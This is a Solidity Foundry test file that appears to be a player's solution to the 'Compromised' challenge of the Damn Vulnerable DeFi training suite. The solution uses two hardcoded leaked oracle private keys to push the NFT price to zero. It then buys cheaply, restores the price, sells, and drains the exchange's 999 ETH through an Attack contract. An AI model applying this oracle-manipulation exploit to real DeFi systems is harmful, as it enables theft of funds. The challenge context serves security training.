// SPDX-License-Identifier: MIT
// Damn Vulnerable DeFi v4 (https://damnvulnerabledefi.xyz)
pragma solidity =0.8.25;

import {Test, console} from "forge-std/Test.sol";
import {VmSafe} from "forge-std/Vm.sol";

import {TrustfulOracle} from "../../src/compromised/TrustfulOracle.sol";
import {TrustfulOracleInitializer} from "../../src/compromised/TrustfulOracleInitializer.sol";
import {Exchange} from "../../src/compromised/Exchange.sol";
import {DamnValuableNFT} from "../../src/DamnValuableNFT.sol";
import {IERC721Receiver} from "@openzeppelin/contracts/token/ERC721/IERC721Receiver.sol";

contract CompromisedChallenge is Test {
    address deployer = makeAddr("deployer");
    address player = makeAddr("player");
    address recovery = makeAddr("recovery");

    uint256 constant EXCHANGE_INITIAL_ETH_BALANCE = 999 ether;
    uint256 constant INITIAL_NFT_PRICE = 999 ether;
    uint256 constant PLAYER_INITIAL_ETH_BALANCE = 0.1 ether;
    uint256 constant TRUSTED_SOURCE_INITIAL_ETH_BALANCE = 2 ether;


    address[] sources = [
        0x188Ea627E3531Db590e6f1D71ED83628d1933088,
        0xA417D473c40a4d42BAd35f147c21eEa7973539D8,
        0xab3600bF153A316dE44827e2473056d56B774a40
    ];
    string[] symbols = ["DVNFT", "DVNFT", "DVNFT"];
    uint256[] prices = [INITIAL_NFT_PRICE, INITIAL_NFT_PRICE, INITIAL_NFT_PRICE];

    TrustfulOracle oracle;
    Exchange exchange;
    DamnValuableNFT nft;

    modifier checkSolved() {
        _;
        _isSolved();
    }

    function setUp() public {
        startHoax(deployer);

        // Initialize balance of the trusted source addresses
        for (uint256 i = 0; i < sources.length; i++) {
            vm.deal(sources[i], TRUSTED_SOURCE_INITIAL_ETH_BALANCE);
        }

        // Player starts with limited balance
        vm.deal(player, PLAYER_INITIAL_ETH_BALANCE);

        // Deploy the oracle and setup the trusted sources with initial prices
        oracle = (new TrustfulOracleInitializer(sources, symbols, prices)).oracle();

        // Deploy the exchange and get an instance to the associated ERC721 token
        exchange = new Exchange{value: EXCHANGE_INITIAL_ETH_BALANCE}(address(oracle));
        nft = exchange.token();

        vm.stopPrank();
    }

    /**
     * VALIDATES INITIAL CONDITIONS - DO NOT TOUCH
     */
    function test_assertInitialState() public view {
        for (uint256 i = 0; i < sources.length; i++) {
            assertEq(sources[i].balance, TRUSTED_SOURCE_INITIAL_ETH_BALANCE);
        }
        assertEq(player.balance, PLAYER_INITIAL_ETH_BALANCE);
        assertEq(nft.owner(), address(0)); // ownership renounced
        assertEq(nft.rolesOf(address(exchange)), nft.MINTER_ROLE());
    }

    /**
     * CODE YOUR SOLUTION HERE
     */
    function test_compromised() public checkSolved {
        uint256 first_pk = 0x7d15bba26c523683bfc3dc7cdc5d1b8a2744447597cf4da1705cf6c993063744;
        address first_eoa = vm.addr(first_pk);

        uint256 mid_pk = 0x68bd020ad186b647a691c6a5c0c1529f21ecd09dcc45241402ac60ba377c4159;
        address mid_eoa = vm.addr(mid_pk);

        vm.startPrank(first_eoa);
        oracle.postPrice("DVNFT", 0 ether);
        vm.stopPrank();

        vm.startPrank(mid_eoa);
        oracle.postPrice("DVNFT", 0 ether);
        vm.stopPrank();

        // uint256 mid_price = oracle.getMedianPrice("DVNFT");
        
        // console.log(mid_price);
        // console.log(address(exchange).balance);

        Attack a = new Attack(payable(address(exchange)), address(oracle), address(nft), recovery);
        uint256 id = a.buy{value:0.1 ether}();
        vm.startPrank(mid_eoa);
        oracle.postPrice("DVNFT", 999 ether);
        vm.stopPrank();
        a.sell(id);

        console.log(address(exchange).balance);
    }

    /**
     * CHECKS SUCCESS CONDITIONS - DO NOT TOUCH
     */
    function _isSolved() private view {
        // Exchange doesn't have ETH anymore
        // 거래소 자금 탈취
        assertEq(address(exchange).balance, 0);

        // ETH was deposited into the recovery account
        // 자금 recovery 송금
        assertEq(recovery.balance, EXCHANGE_INITIAL_ETH_BALANCE);

        // Player must not own any NFT
        // nft 팔기
        assertEq(nft.balanceOf(player), 0);

        // NFT price didn't change
        // 가격값 복구
        assertEq(oracle.getMedianPrice("DVNFT"), INITIAL_NFT_PRICE);
    }
}

contract Attack is IERC721Receiver {
    Exchange public immutable exchange;
    TrustfulOracle public immutable oracle;
    DamnValuableNFT public immutable nft;
    address public immutable recovery;

    constructor(address payable _exchange, address _oracle, address _nft, address _recovery) {
        exchange = Exchange(_exchange);
        oracle = TrustfulOracle(_oracle);
        nft = DamnValuableNFT(_nft);
        recovery = _recovery;
    }

    function buy() public payable returns (uint256){
        return exchange.buyOne{value:0.1 ether}();
    }

    function sell(uint256 id) public payable{
        // 판매 전 승인 필요
        nft.approve(address(exchange), id);
        exchange.sellOne(id);
        (bool ok, ) = recovery.call{value: address(this).balance-1e17}("");
        require(ok, "recovery transfer failed");
    }

    function onERC721Received(address, address, uint256, bytes calldata) external pure override returns (bytes4) {
        return IERC721Receiver.onERC721Received.selector;
    }

    receive() external payable {}

    fallback() external payable {}
}
